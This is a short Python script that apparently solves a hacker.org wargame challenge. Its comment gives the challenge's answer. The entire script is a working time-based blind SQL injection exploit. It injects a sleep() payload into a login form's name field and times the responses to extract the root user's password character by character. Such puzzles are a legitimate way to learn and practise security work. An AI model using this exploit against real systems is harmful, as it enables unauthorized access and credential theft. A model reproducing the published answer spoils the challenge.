#!/usr/bin/env python3

# Q: http://www.hacker.org/challenge/chal.php?id=181
# A: http://www.hacker.org/challenge/chal.php?answer=theluvthatburns&id=181&go=Submit

import time
import urllib.request

def main():
    BASE_URL = 'http://www.adum.com/inscrutable/index.php'
    ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    DURATION = 5.0
    
    password = ''
    while True:
        found = False
        for ch in ALPHABET:
            name = "root' and (select password from user where name = 'root') like '{prefix}%' and sleep({duration}) or '' <> '".format(prefix=password + ch, duration=DURATION)
            
            begin_time = time.time()
            urllib.request.urlopen('{base_url}?{parameters}'.format(base_url=BASE_URL, parameters=urllib.parse.urlencode({'name':name, 'password':''}))).read().decode()
            end_time = time.time()
            
            if end_time - begin_time > DURATION:
                password += ch
                print('prefix:', password)
                found = True
                break
        
        if not found:
            break
    
    print()
    print('password:', password)

if __name__ == '__main__':
    main()
